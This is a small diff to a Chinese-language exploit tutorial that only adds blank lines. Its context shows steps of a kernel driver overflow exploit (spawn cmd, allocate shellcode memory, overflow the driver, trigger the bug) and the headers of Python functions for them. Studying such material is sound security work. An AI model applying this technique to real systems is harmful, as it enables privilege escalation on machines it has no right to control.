@@ -243,6 +243,7 @@ find_system_process
 4. 为shellcode分配内存
 5. 创建一个字符串用于溢出驱动
 6. 触发漏洞
+
 第一步，创建cmd进程
 ```PYTHON
 def procreate():
@@ -281,6 +282,7 @@ def procreate():
     return lpProcessInformation.dwProcessId
 ```
 其中第二及第三步在`BSOD`部分已经说过，不再重复。
+
 第四步，为shellcode分配内存。
 ```PYTHON
 def shellcode(pid):
